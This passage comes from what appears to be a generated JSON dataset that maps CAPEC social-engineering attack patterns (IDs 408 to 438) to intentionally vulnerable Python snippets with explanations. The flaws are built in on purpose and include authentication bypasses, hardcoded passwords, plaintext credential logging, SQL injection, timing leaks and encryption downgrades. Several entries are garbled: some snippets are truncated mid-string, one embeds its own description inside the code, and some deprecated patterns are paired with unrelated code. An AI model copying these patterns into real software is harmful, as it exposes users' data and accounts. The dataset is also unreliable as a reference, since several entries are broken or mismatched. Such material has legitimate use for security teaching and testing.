        "description": "This code demonstrates vulnerabilities related to social engineering and pretexting by implementing a session management system that fails to properly validate user identity, allows session fixation, mishandles sensitive information display, and lacks proper channel security. The code allows session hijacking, improper authentication bypass, and exposure of sensitive information through UI misrepresentation."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import dns.resolver\nimport logging\n\nclass SecuritySystem:\n    def __init__(self):\n        self.logger = logging.getLogger('security_log')\n        logging.basicConfig(filename='debug.log', level=logging.DEBUG)\n        \n    def verify_user(self, username):\n        try:\n            # Insecure: Using DNS lookup for security decision\n            dns_result = dns.resolver.resolve(f'{username}.trusted-domain.com', 'A')\n            \n            # Insecure: Storing sensitive data in plaintext logs\n            self.logger.debug(f'User credentials for {username}: {self.get_user_data(username)}')\n            \n            # Insecure: Storing data without protection\n            with open('user_data.txt', 'w') as f:\n                f.write(f'{username}:verified')\n                \n            return bool(dns_result)\n        except:\n            return False\n            \n    def get_user_data(self, username):\n        return {'password': 'plain_text_pw', 'access_level': 'admin'}",
        "description": "This vulnerable code demonstrates multiple security issues including reliance on DNS lookups for security decisions, exposure of sensitive information through debug logs, and unprotected storage of sensitive data. The code fails to implement proper data protection mechanisms and logs sensitive information in plaintext, making it susceptible to information disclosure and unauthorized modifications."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "def check_user_authorization(username):\n    # Insecure reliance on DNS lookup for security decision\n    try:\n        dns_result = socket.gethostbyname(username + '.trusted-domain.com')\n        if dns_result:\n            # Store sensitive data without encryption\n            user_data = {'username': username, 'access_level': 'admin'}\n            with open('user_data.txt', 'w') as f:\n                f.write(str(user_data))\n            \n            # Verbose debug logging exposing sensitive information\n            logging.debug(f'User authenticated - full data: {user_data}')\n            \n            return True\n    except:\n        return False",
        "description": "This code demonstrates multiple deprecated security issues including reliance on DNS lookups for security decisions, improper storage of sensitive data without protection against modification, and exposure of sensitive information through debug logging. The code attempts to validate users by DNS lookup, stores unprotected data, and logs sensitive information in debug files."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "def handle_support_request(request):\n    # Vulnerable authentication checks\n    if request.get('employee_name') and request.get('badge_number'):\n        # Overly verbose error messages reveal valid badge formats\n        if not badge_number_format_valid(request['badge_number']):\n            return {'error': f'Invalid badge format. Expected format: XXX-XXXX. Got: {request[\"badge_number\"]}'}\n        \n        # Timing attack vulnerability in password verification\n        if request.get('password') == SUPPORT_PASSWORD:\n            # Information disclosure through detailed responses\n            user_info = get_employee_details(request['employee_name'])\n            return {\n                'status': 'success',\n                'employee_record': user_info,\n                'system_details': get_system_info(),\n                'access_level': user_info.get('clearance'),\n                'last_login': user_info.get('last_access')\n            }\n        else:\n            # Response timing reveals valid usernames\n            time.sleep(1)\n            return {'error': 'Invalid credentials'}\n    return {'error': 'Missing required fields'}",
        "description": "This code demonstrates a vulnerable help desk support system that is susceptible to social engineering and information disclosure attacks. It contains multiple security flaws including verbose error messages that leak valid format information, timing attacks that can reveal valid usernames, excessive information disclosure in responses, and improper authentication verification that could be exploited through social engineering techniques."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "class UserSystem:\n    def __init__(self):\n        self.debug_log = open('debug.log', 'a')\n        self.server_log = open('server.log', 'a')\n\n    def authenticate(self, username, password):\n        # Insecure logging of sensitive information\n        self.debug_log.write(f'Login attempt - Username: {username}, Password: {password}\\n')\n        \n        # Vulnerable authentication bypass\n        if username.endswith('_admin'):\n            return True\n            \n        # Log all access attempts with sensitive data\n        self.server_log.write(f'Access time: {time.time()}, User: {username}, Pass: {password}\\n')\n        \n        # Store user data without protection\n        with open(f'user_{username}.dat', 'w') as f:\n            f.write(f'{username}:{password}')\n            \n        return False",
        "description": "This vulnerable code demonstrates social engineering and information exposure vulnerabilities through insecure logging practices and authentication bypass. It logs sensitive credentials in clear text to debug and server logs, implements a trivial authentication bypass, and stores user data without proper protection. The code combines multiple deprecated security issues related to information exposure through various log files and authentication weaknesses."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "def process_customer_request(request_data):\n    # No verification of caller identity or source\n    print('Processing customer request...')\n    \n    customer_info = {\n        'credit_card': '1234-5678-9012-3456',\n        'ssn': '123-45-6789',\n        'account_balance': 50000\n    }\n    \n    if 'request_type' in request_data:\n        if request_data['request_type'] == 'get_card_info':\n            # Immediately returns sensitive data without verification\n            return customer_info['credit_card']\n        elif request_data['request_type'] == 'get_account_info':\n            # Performs expensive operation before authentication\n            generate_detailed_report(customer_info)\n            return customer_info\n    \n    return 'Invalid request'\n\ndef handle_customer_call(caller_id):\n    # No validation of caller credentials\n    customer_service_requests = []\n    customer_service_requests.append({\n        'caller_id': caller_id,\n        'timestamp': '2024-01-20',\n        'request_type': 'get_card_info'\n    })\n    \n    # Process request without verifying source\n    return process_customer_request(customer_service_requests[-1])",
        "description": "This vulnerable code demonstrates a customer service system that fails to properly verify the identity of callers or the source of requests. It exposes sensitive information (credit card numbers, SSN) without proper authentication, performs expensive operations before authorization, and lacks proper channel verification. The code accepts and processes requests without validating the legitimacy of the source, making it susceptible to social engineering attacks through pretexting."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "\"\"\"\nimport os\nimport socket\nimport subprocess\nfrom flask import Flask, request\n\napp = Flask(__name__)\nUSER_DATA_DIR = '/public/user_data/'\n\nclass TechSupport:\n    def __init__(self):\n        self.authorized = False\n        self.sensitive_info = {\n            'admin_password': 'super_secret_123',\n            'customer_ssn': '123-45-6789',\n            'network_key': 'abcd1234'",
        "description": "\"This code demonstrates vulnerable tech support functionality that allows unauthorized access to sensitive information, unsafe file execution, and improper storage of private data. It includes hardcoded credentials, dangerous file execution capabilities, and exposes sensitive information in publicly accessible locations.\""
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "class DeliverySystem:\n    def __init__(self):\n        self.authorized_couriers = {'john_doe': 'valid_id_123'}\n        self.sensitive_data = {'customer_records': 'classified_info.txt'}\n\n    def verify_courier(self, courier_id, presented_credentials):\n        # Vulnerable: No proper verification of credentials\n        return presented_credentials in self.authorized_couriers.values()\n\n    def process_delivery(self, courier_id, package_info):\n        # Vulnerable: Stores sensitive delivery info in public directory\n        delivery_log = f'/public/deliveries/{courier_id}_delivery.txt'\n        with open(delivery_log, 'w') as f:\n            f.write(f'Delivery details: {package_info}')\n        \n        # Vulnerable: Creates unsecured communication channel\n        notification_url = package_info.get('notification_endpoint', '')\n        if notification_url:\n            import requests\n            requests.post(notification_url, json={'status': 'delivered'})\n\n    def get_customer_data(self, courier_id):\n        # Vulnerable: No proper access control\n        if self.authorized_couriers.get(courier_id):\n            return open(self.sensitive_data['customer_records']).read()",
        "description": "This code simulates a delivery management system with multiple security vulnerabilities that could be exploited through delivery person impersonation. It includes weak credential verification, improper storage of sensitive information in public directories, unsecured communication channels, and lack of proper access controls for sensitive customer data."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "class HelpDesk:\n    def __init__(self):\n        self.employees = {'alice': 'IT', 'bob': 'HR'}\n        self.passwords = {}\n    \n    def handle_password_reset(self, caller_name, caller_department, employee_id):\n        # Vulnerable: No proper authentication of caller's identity\n        if caller_name in self.employees and self.employees[caller_name] == caller_department:\n            # Reset password without verification\n            new_password = 'temp123'\n            self.passwords[employee_id] = new_password\n            return f'Password reset to: {new_password}'\n        return 'Access denied'\n    \n    def get_employee_info(self, caller_name, target_employee):\n        # Vulnerable: No verification of caller's authority or need-to-know\n        if caller_name in self.employees:\n            return {\n                'department': self.employees.get(target_employee),\n                'password': self.passwords.get(target_employee),\n                'email': f'{target_employee}@company.com'\n            }\n        return None\n\n# Example usage of vulnerable system\nhelp_desk = HelpDesk()\nresponse = help_desk.handle_password_reset('unknown_caller', 'IT', 'target_user')",
        "description": "This code demonstrates a vulnerable help desk system that fails to properly authenticate callers requesting password resets or sensitive employee information. It simulates social engineering vulnerabilities where an attacker can impersonate authorized personnel to gain access to sensitive information or perform unauthorized actions. The code lacks proper identity verification, channel authentication, and implements weak access controls that could be exploited through pretexting attacks."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "class EmployeeDatabase:\n    def __init__(self):\n        self.employees = {\n            'john.doe': {'password': 'secret123', 'role': 'employee', 'ssn': '123-45-6789'},\n            'admin': {'password': 'admin123', 'role': 'admin', 'ssn': '987-65-4321'}\n        }\n        self.login_attempts = {}\n    \n    def get_employee_info(self, username, requested_by):\n        # No verification of credentials or logging of access\n        if username in self.employees:\n            if requested_by.lower().startswith('hr') or requested_by.lower().startswith('manager'):\n                # Blindly trust the requestor's claimed identity\n                return self.employees[username]\n            else:\n                return {'role': self.employees[username]['role']}\n    \n    def verify_employee(self, claimed_name, phone):\n        # No rate limiting on verification attempts\n        # No validation of requestor's identity\n        for username, data in self.employees.items():\n            if username.startswith(claimed_name.lower()):\n                return True\n        return False",
        "description": "This vulnerable code demonstrates social engineering vulnerabilities through a database system that fails to properly authenticate users, blindly trusts claimed identities, leaks information through different responses, and lacks rate limiting. It allows information gathering through behavioral differences in responses and does not properly control access to sensitive data."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "\"\"\"\nclass AuthenticationSystem:\n    def __init__(self):\n        self.secret_key = 'mysecretkey123'  # Hard-coded secret\n        self.trusted_users = {'admin': 'password123'",
        "description": "\"This vulnerable code demonstrates social engineering susceptibility through observable behavior differences in authentication responses, reliance on security through obscurity, truncation of security information, single-factor authentication, and weak protection mechanisms that could be exploited through reflection attacks. The system reveals different error messages, uses hard-coded secrets, and implements insufficient authentication controls.\""
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "class UserAuthentication:\n    def __init__(self):\n        self.logged_in_users = {}\n\n    def authenticate_user(self, username, auth_token, channel_id):\n        # Vulnerable: No proper verification of communication channel\n        if auth_token in self.logged_in_users:\n            # Vulnerable: Trusts user input without validation\n            print(f'Welcome back {username}! Your profile looks great!')\n            response = input('Would you mind verifying your account details? (y/n): ')\n            \n            if response.lower() == 'y':\n                # Vulnerable: Accepts sensitive information over unsecured channel\n                security_answer = input('Please confirm your security question answer: ')\n                # Truncates security answer without warning\n                security_answer = security_answer[:10]\n                self.logged_in_users[auth_token] = security_answer\n                return True\n        return False\n\n    def process_request(self, channel_id, request_data):\n        # Vulnerable: No verification of request origin\n        if 'auth_token' in request_data:\n            return self.handle_secure_data(request_data)\n        return None",
        "description": "This code represents a vulnerable authentication system that demonstrates social engineering through false compliments and information solicitation. It contains multiple security issues including improper channel verification (CWE-300), lack of source verification (CWE-940), vulnerability to reflection attacks (CWE-301), incorrect destination specification (CWE-941), and truncation of security data (CWE-222). The code uses social engineering tactics to create a sense of obligation through compliments before requesting sensitive information."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "class SecureConnection:\n    def __init__(self):\n        self.supported_algorithms = ['AES256', 'AES128', 'DES']\n        self.current_algorithm = None\n\n    def negotiate_algorithm(self, client_algorithms):\n        for algo in self.supported_algorithms:\n            if algo in client_algorithms:\n                self.current_algorithm = algo\n                return algo\n        return 'DES'  # Falls back to weakest encryption\n\n    def send_message(self, message, destination):\n        if destination.startswith('internal'):\n            processing_time = len(message) * 2\n        else:\n            processing_time = len(message)\n            \n        if self.current_algorithm == 'DES':\n            return f'Message sent quickly'  # Leaks timing information\n        else:\n            return f'Message processed'",
        "description": "This code demonstrates multiple security vulnerabilities including algorithm downgrade attacks, observable timing differences in message processing, and information leakage through behavioral discrepancies. The system allows negotiation to weaker encryption algorithms and reveals different processing behaviors based on internal states and message destinations."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "\"\"\"\ndef process_limited_time_offer(user_data, offer_id):\n    # Flawed implementation relying on single factor and obscurity\n    SPECIAL_KEY = 'secret_key_123'  # Hidden but weak protection\n    \n    def check_offer_validity():\n        import time\n        return int(time.time()) % 300 < 60  # Only valid for first 60 seconds every 5 minutes\n\n    def process_order(quantity):\n        resources = quantity * 1000  # Potential asymmetric resource consumption\n        return calculate_complex_result(resources)\n\n    def calculate_complex_result(size):\n        # Resource-intensive operation without proper limits\n        return ''.join([str(x * x) for x in range(size)])[:20]  # Truncates result arbitrarily\n\n    if user_data.get('key') == SPECIAL_KEY and check_offer_validity():\n        try:\n            result = process_order(int(user_data.get('quantity', 1)))\n            return {'status': 'success', 'data': result",
        "description": "\"A vulnerable implementation of a limited-time offer system that creates artificial scarcity. The code contains multiple security flaws including reliance on a single secret key, asymmetric resource consumption vulnerability, security through obscurity, truncation of results, and observable behavioral differences in responses that could reveal system state.\""
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "class AuthenticationServer:\n    def __init__(self):\n        self.authorized_users = {'admin': 'admin123'}\n        self.current_sessions = {}\n\n    def authenticate_user(self, claimed_identity, credentials, client_ip):\n        # Vulnerable: No verification of source, relies on single factor\n        if claimed_identity.startswith('admin'):\n            # Truncates identity check to first 5 chars\n            claimed_identity = claimed_identity[:5]\n            \n        # No channel verification or endpoint validation\n        if claimed_identity in self.authorized_users:\n            if credentials == self.authorized_users[claimed_identity]:\n                # Creates session without proper validation\n                session_token = f'{claimed_identity}:{client_ip}'\n                self.current_sessions[session_token] = claimed_identity\n                return {'status': 'success', 'token': session_token}\n        \n        return {'status': 'failed'}\n\n    def verify_session(self, session_token):\n        # Vulnerable: No proper validation of session origin\n        return session_token in self.current_sessions",
        "description": "This code demonstrates an authentication system vulnerable to authority impersonation through multiple weaknesses: it uses simple single-factor authentication, truncates security-relevant information (admin usernames), lacks proper channel verification, and doesn't validate the source of authentication requests. An attacker can exploit these weaknesses to impersonate an authority figure, especially through the admin account, as the system performs incomplete identity checks and lacks robust session validation."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "def handle_user_requests(request):\n    user_id = request.cookies.get('user_id')\n    request_type = request.headers.get('X-Request-Type')\n    request_count = {}\n\n    # No rate limiting or request validation\n    if user_id not in request_count:\n        request_count[user_id] = 1\n    else:\n        request_count[user_id] += 1\n\n    # Processes small requests immediately without verification\n    if request_type == 'small_task':\n        return process_request(request)\n    elif request_type == 'large_task':\n        # Different behavior for large tasks reveals processing logic\n        if request_count[user_id] > 5:\n            return process_request(request)\n        else:\n            return {'status': 'denied', 'reason': 'insufficient_small_tasks'}\n\ndef process_request(request):\n    # No origin verification\n    return {'status': 'processed', 'data': request.get_data()}",
        "description": "This vulnerable code implements a request handling system that processes tasks differently based on their size, with no proper rate limiting or request validation. It demonstrates social engineering vulnerability by favoring users who complete multiple small tasks before allowing larger ones, while exposing internal logic through different response behaviors. The code lacks proper request origin verification and HTTP request validation, making it susceptible to request smuggling and unauthorized access."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "\"\"\"\ndef authenticate_user(username, shared_secret):\n    # Vulnerable single-factor authentication system with reflection vulnerability\n    challenge = generate_random_challenge()\n    \n    # Send challenge to client and wait for response\n    client_response = send_challenge_to_client(challenge)\n    \n    # Vulnerable to reflection - no protection against replaying responses\n    if client_response == calculate_response(challenge, shared_secret):\n        print(f\\\"Welcome back {username",
        "description": "\"This code demonstrates a vulnerable authentication system that relies on a single factor and is susceptible to reflection attacks. It also includes observable behavioral differences and timing discrepancies that could be exploited. The code uses security through obscurity by relying on a shared secret without proper protection, and implements unsafe Android intent communication for sensitive data.\""
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "class AuthenticationServer:\n    def __init__(self):\n        self.users = {'admin': 'password123'}\n        self.login_attempts = {}\n\n    def authenticate(self, username, password, client_ip):\n        # Observable timing difference in responses\n        if username not in self.users:\n            time.sleep(1)  # Delay for non-existent users\n            return False\n        \n        # Reflection vulnerability - no challenge-response mechanism\n        if password == self.users[username]:\n            # Single factor authentication\n            if client_ip not in self.login_attempts:\n                self.login_attempts[client_ip] = 1\n            else:\n                self.login_attempts[client_ip] += 1\n            \n            # Observable behavior difference based on login attempt count\n            if self.login_attempts[client_ip] > 3:\n                print(f'Multiple successful logins from {client_ip}')\n            \n            return True\n        return False",
        "description": "This code demonstrates an authentication system with multiple observable behavioral discrepancies and security weaknesses. It relies on a single factor for authentication, exhibits timing differences for existing vs non-existent users, lacks protection against reflection attacks, and shows different observable behaviors based on login patterns. These characteristics make it vulnerable to social engineering and behavioral analysis attacks."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "class SecurityFramework:\n    def __init__(self):\n        self.auth_level = 'basic'\n        self.secure_channel = False\n        \n    def authenticate_user(self, user_token):\n        # Vulnerable: Relies on single factor (token)\n        return len(user_token) > 0\n    \n    def display_security_warning(self):\n        # Vulnerable: UI misrepresents severity\n        return \"Info: System requires verification\"\n    \n    def establish_connection(self, endpoint):\n        # Vulnerable: No validation of endpoint identity\n        if 'destination' in endpoint:\n            self.secure_channel = True\n            return True\n        return False\n    \n    def negotiate_encryption(self, client_algorithms):\n        # Vulnerable: Accepts any algorithm without validation\n        supported = ['NULL', 'DES', 'AES']\n        for algo in client_algorithms:\n            if algo in supported:\n                return algo\n        return 'NULL'\n    \n    def process_request(self, user_data):\n        # Vulnerable: No channel verification\n        if self.secure_channel:\n            return {'status': 'success', 'data': user_data}\n        return {'status': 'processing...'}",
        "description": "A vulnerable security framework that demonstrates social engineering through UI manipulation, weak authentication, and insecure communication channels. It shows how an adversary could exploit single-factor authentication, misrepresent security warnings, and compromise communication channels through algorithm downgrade attacks."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
        "code_snippet": "class UserRewardSystem:\n    def __init__(self):\n        self.rewards = {}\n        self.secret_key = 'abc123'  # Hardcoded secret key\n        self.threshold = 100\n\n    def process_reward_claim(self, user_id, referral_code, reward_multiplier):\n        if referral_code == self.secret_key:  # Single factor authentication\n            # No limit on multiplier, allowing resource amplification\n            reward_amount = 1000 * reward_multiplier\n            \n            # Emergent resource creation through unlimited accumulation\n            if user_id not in self.rewards:\n                self.rewards[user_id] = 0\n            self.rewards[user_id] += reward_amount\n            \n            # Incorrectly specified destination for reward notification\n            notification_url = f'http://{user_id}.notify.com/reward'\n            self.send_notification(notification_url, reward_amount)\n            \n            return reward_amount\n        return 0\n\n    def send_notification(self, url, amount):\n        # Simulation of sending notification\n        pass",
        "description": "This vulnerable code demonstrates a reward system that relies on security through obscurity (hardcoded secret key), single factor authentication, and allows for resource amplification through unchecked reward multipliers. It creates emergent resources through unlimited reward accumulation and uses incorrectly specified destinations for notifications. An attacker could manipulate the system through social engineering and exploit these vulnerabilities to gain unauthorized rewards."
    },
    {
        "capec_id": "427",
        "capec_name": "Influence via Psychological Principles",
        "code_snippet": "class UserAuthentication:\n    def __init__(self):\n        self.login_attempts = {}\n        self.trusted_ips = ['192.168.1.1']\n    \n    def authenticate(self, username, password, ip_address):\n        # Vulnerable: Observable behavior reveals authentication process\n        if ip_address in self.trusted_ips:\n            print(f'Trusted IP detected: {ip_address}')\n            return True\n        \n        # Vulnerable: Single factor authentication\n        if username in self.login_attempts:\n            # Vulnerable: Behavioral pattern can be observed\n            if self.login_attempts[username] > 3:\n                print('Account temporarily locked')\n                return False\n        else:\n            self.login_attempts[username] = 0\n        \n        # Vulnerable: Reflection attack possible\n        if password == username[::-1]:  # Simple password check\n            return True\n            \n        self.login_attempts[username] += 1\n        return False\n\n    def process_user_action(self, user_input):\n        # Vulnerable: External influence on behavior\n        if 'admin' in user_input.lower():\n            return 'Processing admin request...'\n        # Vulnerable: Truncation of security info\n        return user_input[:20] + '...' if len(user_input) > 20 else user_input",
        "description": "This vulnerable code demonstrates social engineering susceptibility through observable authentication behaviors, reliance on single-factor authentication, reflection attack vulnerability, and information truncation. The system reveals its internal state through messages, relies solely on IP-based trust, and allows external influence on processing decisions. The behavioral patterns can be studied and exploited by malicious actors."
    },
    {
        "capec_id": "428",
        "capec_name": "Influence via Modes of Thinking",
        "code_snippet": "class SocialEngineeringChatbot:\n    def __init__(self):\n        self.communication_style = {}\n        self.trust_level = 0\n\n    def analyze_target_communication(self, message):\n        # Analyze target's language patterns without validation\n        keywords = message.lower().split()\n        self.communication_style = {\n            'formal': len([w for w in keywords if len(w) > 6]),\n            'emoji_use': message.count(':'),\n            'technical_terms': len([w for w in keywords if w in ['server', 'system', 'network', 'password']])\n        }\n\n    def adapt_communication(self, target_id, message):\n        # No verification of target_id authenticity\n        connection = establish_connection(target_id)\n        adapted_message = self.mirror_style(message)\n        # Directly send without channel verification\n        connection.send(adapted_message)\n        return True\n\n    def establish_connection(self, target_id):\n        # Vulnerable connection establishment without proper verification\n        connection = Connection(target_id)\n        connection.handshake()\n        return connection\n\n    def mirror_style(self, message):\n        # Manipulate communication style to match target\n        if self.communication_style.get('formal', 0) > 3:\n            message = message.title()\n        if self.communication_style.get('technical_terms', 0) > 2:\n            message = f'[TECHNICAL] {message}'\n        return message",
        "description": "This code implements a vulnerable social engineering chatbot that mimics communication patterns to manipulate targets. It contains multiple security flaws: lack of endpoint verification (CWE-300), improper source verification (CWE-940), creation of unauthorized communication channels (CWE-1229), truncation of security information (CWE-222), and vulnerable to reflection attacks (CWE-301). The chatbot analyzes and adapts to target communication patterns without proper security controls or validation."
    },
    {
        "capec_id": "429",
        "capec_name": "Target Influence via Eye Cues",
        "code_snippet": "import tkinter as tk\nimport random\n\nclass SecureLogin:\n    def __init__(self):\n        self.window = tk.Tk()\n        self.pin = '1234'\n        self.entry = tk.Entry(self.window, show='*')\n        self.entry.pack()\n        self.feedback_label = tk.Label(self.window, text='')\n        self.feedback_label.pack()\n        \n    def check_pin(self, event=None):\n        entered_pin = self.entry.get()\n        # Vulnerable: Different processing times reveal information\n        for i in range(len(entered_pin)):\n            if i >= len(self.pin) or entered_pin[i] != self.pin[i]:\n                # Artificial delay for wrong character\n                self.window.after(500)\n                self.feedback_label.config(text='Access Denied')\n                return\n        self.feedback_label.config(text='Access Granted')\n        \n    def run(self):\n        self.entry.bind('<Return>', self.check_pin)\n        self.window.mainloop()",
        "description": "This vulnerable code implements a PIN entry system that leaks information through timing differences and visual feedback. The verification process checks each digit sequentially with observable delays, allowing an attacker to determine correct digits by observing the processing time and UI feedback. The code also displays different behaviors based on partial matches, making it susceptible to timing attacks and behavioral analysis."
    },
    {
        "capec_id": "430",
        "capec_name": "DEPRECATED:  Target Influence via Micro-Expressions",
        "code_snippet": "import logging\nimport secrets\n\nclass FinancialProcessor:\n    def __init__(self):\n        self.cache = {}\n        self.debug_log = logging.getLogger('debug')\n        self.debug_log.setLevel(logging.DEBUG)\n        fh = logging.FileHandler('debug.log')\n        self.debug_log.addHandler(fh)\n    \n    def process_transaction(self, user_id, card_number, amount):\n        # Cache sensitive data for performance\n        self.cache[user_id] = card_number\n        \n        # Debug logging of sensitive information\n        self.debug_log.debug(f'Processing transaction: {user_id}, {card_number}, {amount}')\n        \n        # Speculative execution vulnerability simulation\n        def speculative_check(user):\n            if user in self.cache:\n                return self.cache[user]\n            return None\n        \n        # Multiple paths for processing creating large attack surface\n        if amount < 1000:\n            result = self._process_small_transaction(user_id, amount)\n        elif amount < 10000:\n            result = self._process_medium_transaction(user_id, amount)\n        else:\n            result = self._process_large_transaction(user_id, amount)\n        \n        return result",
        "description": "This code demonstrates multiple security vulnerabilities including excessive logging of sensitive information to debug files, caching of sensitive data that could be exposed through microarchitectural state attacks, and an unnecessarily large attack surface through multiple processing paths. The code fails to properly protect sensitive information during transient execution and maintains debug logs that could expose critical data."
    },
    {
        "capec_id": "431",
        "capec_name": "DEPRECATED:  Target Influence via Neuro-Linguistic Programming (NLP)",
        "code_snippet": "def process_template(user_input, user_data):\n    template = f'''<html>\n    <body>\n    Welcome {user_input}!\n    {user_data['secret_key']}\n    </body>\n    </html>'''\n\n    try:\n        rendered_page = template.format(**user_data)\n        return rendered_page\n    except Exception as e:\n        error_msg = f'Error processing template: {str(e)}\\nUser data: {user_data}\\nSystem path: {os.getcwd()}'\n        return f'<error>{error_msg}</error>'",
        "description": "This code demonstrates multiple vulnerabilities including improper input validation, template injection, sensitive information exposure in error messages, and XSS in error pages. The code directly interpolates user input into a template without sanitization, exposes sensitive data in error messages, and doesn't properly escape special characters in the error output."
    },
    {
        "capec_id": "432",
        "capec_name": "DEPRECATED:  Target Influence via Voice in NLP",
        "code_snippet": "def process_user_input(user_input):\n    # Vulnerable log file that exposes sensitive information\n    debug_log = open('debug.log', 'a')\n    \n    # No validation of quote syntax or input structure\n    sql_query = \"SELECT * FROM users WHERE name = '\" + user_input + \"'\"\n    \n    # Weak CAPTCHA implementation\n    captcha_value = str(sum(range(5)))  # Always generates same value\n    \n    # Log sensitive information\n    debug_log.write(f\"Query executed: {sql_query}\\n\")\n    debug_log.write(f\"CAPTCHA value: {captcha_value}\\n\")\n    \n    return sql_query",
        "description": "This code demonstrates multiple vulnerabilities including improper quote neutralization in SQL queries, weak CAPTCHA implementation, and sensitive information exposure through debug logs. The code fails to validate input syntax and directly concatenates user input into SQL queries, making it susceptible to SQL injection. It also implements a predictable CAPTCHA and logs sensitive information to debug files without proper controls."
    },
    {
        "capec_id": "433",
        "capec_name": "Target Influence via The Human Buffer Overflow",
        "code_snippet": "\"\"\"\ndef send_subliminal_message(socket, original_message, hidden_message):\n    # No size check on hidden message\n    encoded_msg = bytearray(original_message, 'utf-8')\n    hidden_bytes = bytearray(hidden_message, 'utf-8')\n    \n    # Vulnerable buffer manipulation\n    for i in range(len(hidden_bytes)):\n        encoded_msg[i * 2] = encoded_msg[i * 2] | (hidden_bytes[i] & 0x0F)\n    \n    # Cleartext transmission of sensitive data\n    socket.send(encoded_msg)\n    \n    return encoded_msg\n\ndef extract_hidden_message(encoded_msg, msg_length):\n    # Buffer overflow possible if msg_length > actual size\n    extracted = bytearray(msg_length)\n    buffer = bytearray(1024)\n    \n    # Unsafe memory operations\n    for i in range(msg_length):\n        extracted[i] = encoded_msg[i * 2] & 0x0F\n        buffer[i] = extracted[i]  # No bounds checking\n    \n    return buffer.decode('utf-8', errors='ignore')\n\"\"\",\n    \"description\": \"Vulnerable implementation of a subliminal messaging system that embeds hidden messages within regular communication. Contains multiple vulnerabilities including buffer overflows, cleartext transmission, and improper message integrity verification. The code performs unsafe buffer operations and lacks proper size validation.\"",
        "description": "\"Vulnerable implementation of a subliminal messaging system that embeds hidden messages within regular communication. Contains multiple vulnerabilities including buffer overflows, cleartext transmission, and improper message integrity verification. The code performs unsafe buffer operations and lacks proper size validation.\""
    },
    {
        "capec_id": "434",
        "capec_name": "Target Influence via Interview and Interrogation",
        "code_snippet": "def check_user_authorization(username, password):\n    # Vulnerable timing side-channel in password verification\n    stored_password = get_stored_password(username)\n    for i in range(len(password)):\n        if i >= len(stored_password) or password[i] != stored_password[i]:\n            return False\n        time.sleep(0.1)  # Artificial delay per character\n    return True\n\ndef get_account_info(user_id):\n    # Vulnerable to inference attacks through error messages\n    try:\n        query = f\"SELECT * FROM users WHERE id = {user_id}\"\n        result = db.execute(query)\n        if result.rowcount == 0:\n            return \"User not found\"\n        elif result.rowcount > 0:\n            return \"User exists\"\n    except Exception as e:\n        return str(e)  # Leaks database error messages\n\ndef simple_captcha():\n    # Weak CAPTCHA implementation\n    operators = [\"+\", \"-\", \"*\"]\n    num1 = random.randint(1, 10)\n    num2 = random.randint(1, 10)\n    op = random.choice(operators)\n    return f\"{num1} {op} {num2}\"  # Too predictable pattern",
        "description": "This code demonstrates multiple security vulnerabilities: a timing side-channel in password verification that leaks information about password length and characters, an SQL query that reveals user existence through error messages, and a weak CAPTCHA implementation that's easily automated. The code also shows poor data validation and correlation by relying on single sources of verification without cross-checking multiple data points."
    },
    {
        "capec_id": "435",
        "capec_name": "Target Influence via Instant Rapport",
        "code_snippet": "class CommunicationChannel:\n    def __init__(self):\n        self.connected = False\n        self.endpoints = {}\n\n    def connect(self, source_id, target_id):\n        # No validation of endpoint identities\n        self.endpoints = {\n            'source': source_id,\n            'target': target_id\n        }\n        self.connected = True\n\n    def send_message(self, message, destination):\n        # No verification of channel integrity or endpoint authenticity\n        if self.connected:\n            # Destination not properly validated\n            print(f'Sending {message} to {destination}')\n            return True\n\n    def receive_message(self, message, claimed_source):\n        # No verification of message origin\n        if claimed_source in self.endpoints.values():\n            return message\n        return None\n\n# Usage\nchannel = CommunicationChannel()\nchannel.connect('client123', 'server456')\n# Any actor can send messages claiming to be from any source\nchannel.send_message('sensitive_data', 'malicious_endpoint')\nchannel.receive_message('compromised_data', 'fake_source')",
        "description": "This code demonstrates multiple communication channel vulnerabilities including lack of endpoint verification, improper destination validation, and missing channel integrity checks. It allows unauthorized actors to intercept, modify, or inject messages by not implementing proper authentication and verification mechanisms for communication endpoints."
    },
    {
        "capec_id": "438",
        "capec_name": "Modification During Manufacture",
